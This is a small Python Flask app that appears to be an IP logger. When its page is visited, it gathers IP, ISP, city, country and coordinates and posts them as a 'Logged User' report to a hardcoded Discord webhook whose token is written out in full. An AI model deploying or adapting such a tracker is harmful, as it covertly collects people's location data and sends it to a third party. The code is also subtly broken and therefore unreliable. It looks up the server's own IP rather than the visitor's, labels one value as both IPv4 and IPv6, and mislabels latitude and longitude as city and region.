import os
import requests
from flask import Flask, jsonify
import json

app = Flask(__name__)

# Function to get the IP information
def get_ip_info():
    try:
        # Get the external IP details from ipinfo.io
        response = requests.get('https://ipinfo.io/json')
        ip_info = response.json()
        return ip_info
    except Exception as e:
        print(f"Error fetching IP info: {e}")
        return {}

@app.route("/")
def home():
    ip_info = get_ip_info()

    # Safely split location info (city, region)
    location = ip_info.get('loc', '')
    if location and ',' in location:
        city, region = location.split(',')
    else:
        city, region = 'Unknown', 'Unknown'

    # Prepare the embed message for Discord
    embed = {
        "title": f"Logged User - Port {os.getenv('PORT', 'Unknown')}",
        "description": "User Information",
        "fields": [
            {"name": "IPv6", "value": f"`{ip_info.get('ip', 'Unknown')}`", "inline": True},
            {"name": "IPv4", "value": f"`{ip_info.get('ip', 'Unknown')}`", "inline": True},
            {"name": "ISP", "value": f"`{ip_info.get('org', 'Unknown ISP')}`", "inline": True},
            {"name": "City", "value": f"`{city.strip()}`", "inline": True},
            {"name": "Region", "value": f"`{region.strip()}`", "inline": True},
            {"name": "Country", "value": f"`{ip_info.get('country', 'Unknown')}`", "inline": True},
            {"name": "Latitude", "value": f"`{ip_info.get('loc', 'Unknown').split(',')[0]}`", "inline": True},
            {"name": "Longitude", "value": f"`{ip_info.get('loc', 'Unknown').split(',')[1]}`", "inline": True},
        ],
        "footer": {
            "text": "IP Log"
        }
    }

    # Send the embed to the Discord webhook
    webhook_url = 'https://discord.com/api/webhooks/1338168922935136267/RpF-lYkLx2Hi5wUATDRPA_-KN0ebYnPQCfy2oNx86Y7Gt_rgq787-vUCtCV4eVXUQS8S'
    payload = {
        "embeds": [embed]
    }
    response = requests.post(webhook_url, json=payload)

    # Return a simple response for confirmation
    return jsonify({"status": "success", "message": "User information sent to webhook."})

if __name__ == "__main__":
    # Run the app using the PORT environment variable from Render
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))

